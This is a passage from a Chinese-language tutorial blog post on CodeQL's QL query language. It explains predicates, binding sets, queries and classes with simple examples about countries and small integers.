class=\"variable\">country</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Belgium&quot;</span></span><br><span class=\"line\">  <span class=\"type\">or</span></span><br><span class=\"line\">  <span class=\"variable\">country</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;France&quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">predicate <span class=\"title function_\">hasCapital</span><span class=\"params\">(string country, string capital)</span> &#123;</span><br><span class=\"line\">  country = <span class=\"string\">&quot;Belgium&quot;</span> <span class=\"type\">and</span> <span class=\"variable\">capital</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Brussels&quot;</span></span><br><span class=\"line\">  <span class=\"type\">or</span></span><br><span class=\"line\">  <span class=\"variable\">country</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Germany&quot;</span> <span class=\"type\">and</span> <span class=\"variable\">capital</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Berlin&quot;</span></span><br><span class=\"line\">  <span class=\"type\">or</span></span><br><span class=\"line\">  <span class=\"variable\">country</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;France&quot;</span> <span class=\"type\">and</span> <span class=\"variable\">capital</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Paris&quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">from string country, string capital</span><br><span class=\"line\">where <span class=\"title function_\">hasCapital</span><span class=\"params\">(country, capital)</span> <span class=\"type\">and</span> <span class=\"variable\">country</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Germany&quot;</span></span><br><span class=\"line\">select country, capital</span><br></pre></td></tr></table></figure>\n\n<p>谓词 isCountry 返回的是一组一元组 {(“Belgium”),(“Germany”),(“France”)}，而 hasCapital 是一组二元组 {(“Belgium”,”Brussels”),(“Germany”,”Berlin”),(“France”,”Paris”)}。这些谓词的元数分别为 1 和 2。</p>\n<p>通常，谓词中的所有元组都具有相同数量的元素。谓词的 arity 就是元素的数量，不包括可能的结果变量。</p>\n<p>QL 中有许多内置谓词。您可以在任何查询中使用这些谓词，而无需导入任何其他模块。除了这些内置谓词之外，您还可以定义自己的谓词：</p>\n<h2 id=\"谓词组成\"><a href=\"#谓词组成\" class=\"headerlink\" title=\"谓词组成\"></a>谓词组成</h2><ul>\n<li>谓词的关键字predicate，或者谓词的返回值。（谓词可以分为without result 和 with result）</li>\n<li>谓词名词</li>\n<li>谓词参数</li>\n<li>谓词主体</li>\n</ul>\n<h2 id=\"without-result\"><a href=\"#without-result\" class=\"headerlink\" title=\"without result\"></a>without result</h2><p>开头那两个谓词也是 without result 的</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">predicate <span class=\"title function_\">isSmall</span><span class=\"params\">(<span class=\"type\">int</span> i)</span> &#123;</span><br><span class=\"line\">    i in [<span class=\"number\">1</span> .. <span class=\"number\">9</span>]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">from <span class=\"type\">int</span> i</span><br><span class=\"line\">where <span class=\"title function_\">isSmall</span><span class=\"params\">(i)</span></span><br><span class=\"line\">select i</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"with-result\"><a href=\"#with-result\" class=\"headerlink\" title=\"with result\"></a>with result</h2><p>您可以通过将关键字 predicate 替换为结果类型来定义带有结果的谓词。这引入了特殊变量 result。result的值就是我们的返回值。</p>\n<p>这个from就是定义一个变量。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">getSuccessor</span><span class=\"params\">(<span class=\"type\">int</span> i)</span> &#123;</span><br><span class=\"line\">\tresult = i + <span class=\"number\">1</span> and</span><br><span class=\"line\">\ti in [<span class=\"number\">1</span> .. <span class=\"number\">9</span>]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">from <span class=\"type\">int</span> x</span><br><span class=\"line\">select x,getSuccessor(x)</span><br></pre></td></tr></table></figure>\n\n<p>可以在谓词主体中调用其他的谓词</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Person <span class=\"title function_\">getAChildOf</span><span class=\"params\">(Person p)</span> &#123;</span><br><span class=\"line\">  p = getAParentOf(result)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>谓词还可能对其参数的每个值产生多个结果（或根本没有结果）</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">string <span class=\"title function_\">getANeighbor</span><span class=\"params\">(string country)</span> &#123;</span><br><span class=\"line\">\tcountry = <span class=\"string\">&quot;France&quot;</span> <span class=\"type\">and</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Belgium&quot;</span></span><br><span class=\"line\">\t<span class=\"type\">or</span></span><br><span class=\"line\">\t<span class=\"variable\">country</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;France&quot;</span> <span class=\"type\">and</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Germany&quot;</span></span><br><span class=\"line\">\t<span class=\"type\">or</span></span><br><span class=\"line\">\t<span class=\"variable\">country</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Germany&quot;</span> <span class=\"type\">and</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Austria&quot;</span></span><br><span class=\"line\">\t<span class=\"type\">or</span></span><br><span class=\"line\">\t<span class=\"variable\">country</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Germany&quot;</span> <span class=\"type\">and</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Belgium&quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">select <span class=\"title function_\">getANeighbor</span><span class=\"params\">(<span class=\"string\">&quot;France&quot;</span>)</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Recursive-递归-predicates\"><a href=\"#Recursive-递归-predicates\" class=\"headerlink\" title=\"Recursive(递归) predicates\"></a>Recursive(递归) predicates</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">string <span class=\"title function_\">getANeighbor</span><span class=\"params\">(string country)</span> &#123;</span><br><span class=\"line\">  country = <span class=\"string\">&quot;France&quot;</span> <span class=\"type\">and</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Belgium&quot;</span></span><br><span class=\"line\">  <span class=\"type\">or</span></span><br><span class=\"line\">  <span class=\"variable\">country</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;France&quot;</span> <span class=\"type\">and</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Germany&quot;</span></span><br><span class=\"line\">  <span class=\"type\">or</span></span><br><span class=\"line\">  <span class=\"variable\">country</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Germany&quot;</span> <span class=\"type\">and</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Austria&quot;</span></span><br><span class=\"line\">  <span class=\"type\">or</span></span><br><span class=\"line\">  <span class=\"variable\">country</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Germany&quot;</span> <span class=\"type\">and</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Belgium&quot;</span></span><br><span class=\"line\">  <span class=\"type\">or</span></span><br><span class=\"line\">  <span class=\"variable\">country</span> <span class=\"operator\">=</span> getANeighbor(result)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Kinds-种类-of-predicates\"><a href=\"#Kinds-种类-of-predicates\" class=\"headerlink\" title=\"Kinds(种类) of predicates\"></a>Kinds(种类) of predicates</h2><p>谓词有三种类型，即Non-member谓词、member谓词和Characteristic谓词。</p>\n<p>非成员谓词是在类之外定义的，也就是说，它们不是任何类的成员。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">getSuccessor</span><span class=\"params\">(<span class=\"type\">int</span> i)</span> &#123;  <span class=\"comment\">// 1. Non-member predicate</span></span><br><span class=\"line\">  result = i + <span class=\"number\">1</span> and</span><br><span class=\"line\">  i in [<span class=\"number\">1</span> .. <span class=\"number\">9</span>]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">FavoriteNumbers</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">int</span> &#123;</span><br><span class=\"line\">  FavoriteNumbers() &#123;  <span class=\"comment\">// 2. Characteristic predicate</span></span><br><span class=\"line\">    <span class=\"built_in\">this</span> = <span class=\"number\">1</span> or  <span class=\"comment\">//特征谓词是类的构造函数中定义的谓词，用来描述类的成员资格（membership criteria）。它决定了一个值是否属于某个类。</span></span><br><span class=\"line\">    <span class=\"built_in\">this</span> = <span class=\"number\">4</span> <span class=\"type\">or</span></span><br><span class=\"line\">    <span class=\"variable\">this</span> <span class=\"operator\">=</span> <span class=\"number\">9</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  string <span class=\"title function_\">getName</span><span class=\"params\">()</span> &#123;   <span class=\"comment\">// 3. Member predicate for the class `FavoriteNumbers`</span></span><br><span class=\"line\">    <span class=\"built_in\">this</span> = <span class=\"number\">1</span> <span class=\"type\">and</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;one&quot;</span></span><br><span class=\"line\">    <span class=\"type\">or</span></span><br><span class=\"line\">    <span class=\"variable\">this</span> <span class=\"operator\">=</span> <span class=\"number\">4</span> <span class=\"type\">and</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;four&quot;</span></span><br><span class=\"line\">    <span class=\"type\">or</span></span><br><span class=\"line\">    <span class=\"variable\">this</span> <span class=\"operator\">=</span> <span class=\"number\">9</span> <span class=\"type\">and</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;nine&quot;</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">from FavoriteNumbers fn, string name</span><br><span class=\"line\"><span class=\"type\">where</span> <span class=\"variable\">fn</span> <span class=\"operator\">=</span> <span class=\"number\">4</span> and fn.getName() = name  <span class=\"comment\">// 成员谓词只能在类的实例上应用</span></span><br><span class=\"line\">select name</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Binding-behavior\"><a href=\"#Binding-behavior\" class=\"headerlink\" title=\"Binding behavior\"></a>Binding behavior</h2><p>It must be possible to evaluate a predicate in a finite(有限的) amount of time, so the set it describes is not usually allowed to be infinite(无限的). In other words, a predicate can only contain a finite number of tuples.</p>\n<p>这里的无限其实也不是无穷大或者无穷多。上面和下面的那些反例其实也就是多了一点判断条件。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">getSuccessor</span><span class=\"params\">(<span class=\"type\">int</span> i)</span> &#123;</span><br><span class=\"line\">\tresult = i + <span class=\"number\">1</span> and</span><br><span class=\"line\">\ti in [<span class=\"number\">1</span> .. <span class=\"number\">9</span>]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">  Compilation errors:</span></span><br><span class=\"line\"><span class=\"comment\">  ERROR: &quot;i&quot; is not bound to a value.</span></span><br><span class=\"line\"><span class=\"comment\">  ERROR: &quot;result&quot; is not bound to a value.</span></span><br><span class=\"line\"><span class=\"comment\">  ERROR: expression &quot;i * 4&quot; is not bound to a value.</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">multiplyBy4</span><span class=\"params\">(<span class=\"type\">int</span> i)</span> &#123;</span><br><span class=\"line\">  result = i * <span class=\"number\">4</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">  Compilation errors:</span></span><br><span class=\"line\"><span class=\"comment\">  ERROR: &quot;str&quot; is not bound to a value.</span></span><br><span class=\"line\"><span class=\"comment\">  ERROR: expression &quot;str.length()&quot; is not bound to a value.</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\">predicate <span class=\"title function_\">shortString</span><span class=\"params\">(string str)</span> &#123;</span><br><span class=\"line\">  str.length() &lt; <span class=\"number\">10</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Binding-sets\"><a href=\"#Binding-sets\" class=\"headerlink\" title=\"Binding sets\"></a>Binding sets</h3><p>如果一定要用infinite的谓词。</p>\n<p>在这种情况下，您可以使用 bindingset 注释指定显式绑定集。此注释适用于任何类型的谓词。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bindingset[i]</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">multiplyBy4</span><span class=\"params\">(<span class=\"type\">int</span> i)</span> &#123;</span><br><span class=\"line\">  result = i * <span class=\"number\">4</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">from <span class=\"type\">int</span> i</span><br><span class=\"line\">where i in [<span class=\"number\">1</span> .. <span class=\"number\">10</span>]</span><br><span class=\"line\">select <span class=\"title function_\">multiplyBy4</span><span class=\"params\">(i)</span></span><br></pre></td></tr></table></figure>\n\n<p>也可以多个，这种形式的意思是。x,y至少有一个是bound的。和bindingset[x, y]不同，意味着两个都是bound的</p>\n<ul>\n<li>If <code>x</code> is bound, then <code>x</code> and <code>y</code> are bound.</li>\n<li>If <code>y</code> is bound, then <code>x</code> and <code>y</code> are bound.</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bindingset[x] bindingset[y]</span><br><span class=\"line\">predicate <span class=\"title function_\">plusOne</span><span class=\"params\">(<span class=\"type\">int</span> x, <span class=\"type\">int</span> y)</span> &#123;</span><br><span class=\"line\">  x + <span class=\"number\">1</span> = y</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">from <span class=\"type\">int</span> x, <span class=\"type\">int</span> y</span><br><span class=\"line\"><span class=\"type\">where</span> <span class=\"variable\">y</span> <span class=\"operator\">=</span> <span class=\"number\">42</span> and <span class=\"title function_\">plusOne</span><span class=\"params\">(x, y)</span></span><br><span class=\"line\">select x, y</span><br></pre></td></tr></table></figure>\n\n<p>后者可以用于两种不同类型的情况</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bindingset[str, len]</span><br><span class=\"line\">string <span class=\"title function_\">truncate</span><span class=\"params\">(string str, <span class=\"type\">int</span> len)</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> str.length() &gt; len</span><br><span class=\"line\">  <span class=\"type\">then</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> str.prefix(len)</span><br><span class=\"line\">  <span class=\"keyword\">else</span> result = str</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"查询Queries\"><a href=\"#查询Queries\" class=\"headerlink\" title=\"查询Queries\"></a>查询Queries</h1><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> <span class=\"comment\">/* ... 声明变量 ... */</span></span><br><span class=\"line\"><span class=\"keyword\">where</span> <span class=\"comment\">/* ... logical formula ... */</span></span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"comment\">/* ... expressions ... */</span></span><br></pre></td></tr></table></figure>\n\n<p>除了“表达式”中描述的表达式之外，您还可以包括：<br>as 关键字，后跟名称。这为结果列提供了“标签”，并允许您在后续的选择表达式中使用它们。<br>order by 关键字，后跟结果列的名称，以及可选的关键字 asc 或 desc。这决定了显示结果的顺序。</p>\n<p>from 和 where 部分是可选的。</p>\n<p>除了“表达式”中描述的表达式之外，您还可以包括：</p>\n<ul>\n<li>as 关键字，后跟名称。这为结果列提供了“标签”，并允许您在后续的选择表达式中使用它们。</li>\n<li>order by 关键字，后跟结果列的名称，以及可选的关键字 asc 或 desc。这决定了显示结果的顺序。</li>\n</ul>\n<p>这些和sql都差不多，不同地方在于是，这里的from可以声明变量。</p>\n<p>例子</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> <span class=\"type\">int</span> x, <span class=\"type\">int</span> y</span><br><span class=\"line\"><span class=\"keyword\">where</span> x <span class=\"operator\">=</span> <span class=\"number\">3</span> <span class=\"keyword\">and</span> y <span class=\"keyword\">in</span> [<span class=\"number\">0</span> .. <span class=\"number\">2</span>]</span><br><span class=\"line\"><span class=\"keyword\">select</span> x, y, x <span class=\"operator\">*</span> y <span class=\"keyword\">as</span> product, &quot;product: &quot; <span class=\"operator\">+</span> product</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Query-predicates\"><a href=\"#Query-predicates\" class=\"headerlink\" title=\"Query predicates\"></a>Query predicates</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">getProduct</span><span class=\"params\">(<span class=\"type\">int</span> x, <span class=\"type\">int</span> y)</span> &#123;</span><br><span class=\"line\">    x = <span class=\"number\">3</span> and</span><br><span class=\"line\">    y in [<span class=\"number\">0</span> .. <span class=\"number\">2</span>] <span class=\"type\">and</span></span><br><span class=\"line\">    <span class=\"variable\">result</span> <span class=\"operator\">=</span> x * y</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">from <span class=\"type\">int</span> x, <span class=\"type\">int</span> y</span><br><span class=\"line\"><span class=\"type\">where</span> <span class=\"variable\">x</span> <span class=\"operator\">=</span> <span class=\"number\">3</span> <span class=\"type\">and</span> <span class=\"variable\">y</span> <span class=\"operator\">=</span> <span class=\"number\">1</span> </span><br><span class=\"line\">select x, y,getProduct(x, y)</span><br></pre></td></tr></table></figure>\n\n<p>这个查询谓语返回以下结果</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">x</th>\n<th align=\"left\">y</th>\n<th align=\"left\">result</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">3</td>\n<td align=\"left\">0</td>\n<td align=\"left\">0</td>\n</tr>\n<tr>\n<td align=\"left\">3</td>\n<td align=\"left\">1</td>\n<td align=\"left\">3</td>\n</tr>\n<tr>\n<td align=\"left\">3</td>\n<td align=\"left\">2</td>\n<td align=\"left\">6</td>\n</tr>\n</tbody></table>\n<p>编写查询谓词而不是 select 子句的一个好处是，您也可以在代码的其他部分调用该谓词。相比之下，select 子句就像一个匿名谓词，因此您无法稍后调用它。</p>\n<h1 id=\"Types\"><a href=\"#Types\" class=\"headerlink\" title=\"Types\"></a>Types</h1><h2 id=\"Primitive-types\"><a href=\"#Primitive-types\" class=\"headerlink\" title=\"Primitive types\"></a>Primitive types</h2><p>有以下这些类型。</p>\n<p>boolean，float，int，string，date。</p>\n<p>QL 在原始类型上定义了一系列内置操作，例如，1.toString() 是整数常量 1 的字符串表示形式。有关 QL 中可用的内置操作的完整列表，请参阅 QL 语言规范中的内置部分。</p>\n<p><a href=\"https://codeql.github.com/docs/ql-language-reference/ql-language-specification/#built-ins\">https://codeql.github.com/docs/ql-language-reference/ql-language-specification/#built-ins</a></p>\n<blockquote>\n<p>此外，QlBuiltins::BigInt 中还有一个实验性的任意精度整数原始类型。默认情况下，此类型在 CodeQL CLI 中不可用，但可以通过将 –allow-experimental&#x3D;bigint 选项传 来启用它。</p>\n</blockquote>\n<h2 id=\"Classes\"><a href=\"#Classes\" class=\"headerlink\" title=\"Classes\"></a>Classes</h2><h3 id=\"定义一个类\"><a href=\"#定义一个类\" class=\"headerlink\" title=\"定义一个类\"></a>定义一个类</h3><ol>\n<li>class 关键字</li>\n<li>class 名，要求首字母大写</li>\n<li>通过 extends和instanceof定义的supertypes</li>\n<li>括号括起来的类体</li>\n</ol>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">OneTwoThree</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">int</span> &#123;</span><br><span class=\"line\">  OneTwoThree() &#123; <span class=\"comment\">// characteristic predicate</span></span><br><span class=\"line\">    <span class=\"built_in\">this</span> = <span class=\"number\">1</span> <span class=\"type\">or</span> <span class=\"variable\">this</span> <span class=\"operator\">=</span> <span class=\"number\">2</span> <span class=\"type\">or</span> <span class=\"variable\">this</span> <span class=\"operator\">=</span> <span class=\"number\">3</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  string <span class=\"title function_\">getAString</span><span class=\"params\">()</span> &#123; <span class=\"comment\">// member predicate</span></span><br><span class=\"line\">    result = <span class=\"string\">&quot;One, two or three: &quot;</span> + <span class=\"built_in\">this</span>.toString()</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  predicate <span class=\"title function_\">isEven</span><span class=\"params\">()</span> &#123; <span class=\"comment\">// member predicate</span></span><br><span class=\"line\">    <span class=\"built_in\">this</span> = <span class=\"number\">2</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>定义了一个类 OneTwoThree，它包含值 1 2 3。</p>\n<p>OneTwoThree 继承了 int，也就是说，它是 int 的子类。QL 中的类必须始终具有至少一个supertypes。使用 extends 关键字引用的supertypes称为<strong>base types</strong> of the class。</p>\n<h3 id=\"Class-bodies\"><a href=\"#Class-bodies\" class=\"headerlink\" title=\"Class bodies\"></a>Class bodies</h3><p>The body of a class can contain:</p>\n<ul>\n<li>A characteristic predicate declaration.  &#x2F;&#x2F; 前面讲 谓词种类 的时候都提到了 #Kinds(种类) of predicates</li>\n<li>Any number of member predicate declarations. </li>\n<li>Any number of field declarations.</li>\n</ul>\n<h4 id=\"Characteristic-predicates\"><a href=\"#Characteristic-predicates\" class=\"headerlink\" title=\"Characteristic predicates\"></a>Characteristic predicates</h4><p>相当于构造方法。前面提到过</p>\n<h4 id=\"Member-predicates\"><a href=\"#Member-predicates\" class=\"headerlink\" title=\"Member predicates\"></a>Member predicates</h4><p>可以用这种方法调用一个member predicate</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(OneTwoThree).getAString()</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Fields\"><a href=\"#Fields\" class=\"headerlink\" title=\"Fields\"></a>Fields</h4><p>在body of a class中进行声明，例子如下。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">SmallInt</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">int</span> &#123;</span><br><span class=\"line\">  SmallInt() &#123; <span class=\"built_in\">this</span> = [<span class=\"number\">1</span> .. <span class=\"number\">10</span>] &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">DivisibleInt</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">SmallInt</span> &#123;</span><br><span class=\"line\">  SmallInt divisor;   <span class=\"comment\">// declaration of the field `divisor`</span></span><br><span class=\"line\">  DivisibleInt() &#123; <span class=\"built_in\">this</span> % divisor = <span class=\"number\">0</span> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  SmallInt <span class=\"title function_\">getADivisor</span><span class=\"params\">()</span> &#123; result = divisor &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">from DivisibleInt i</span><br><span class=\"line\">select i, i.getADivisor()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Concrete-classes\"><a href=\"#Concrete-classes\" class=\"headerlink\" title=\"Concrete classes\"></a>Concrete classes</h3><p>比如上面那个 DivisibleInt 有一个  SmallInt 的 Fields</p>\n<p>下面这些就和面向对象的语言很相似，看一下名字就知道是什么意思。不细讲。</p>\n<h3 id=\"Abstract-classes\"><a href=\"#Abstract-classes\" class=\"headerlink\" title=\"Abstract classes\"></a>Abstract classes</h3><p>抽象类</p>\n<h3 id=\"Overriding-member-predicates\"><a href=\"#Overriding-member-predicates\" class=\"headerlink\" title=\"Overriding member predicates\"></a>Overriding member predicates</h3><p>重写父类谓词</p>\n<h3 id=\"Multiple-inheritance\"><a href=\"#Multiple-inheritance\" class=\"headerlink\" title=\"Multiple inheritance\"></a>Multiple inheritance</h3><p>多继承</p>\n<h3 id=\"Final-extensions\"><a 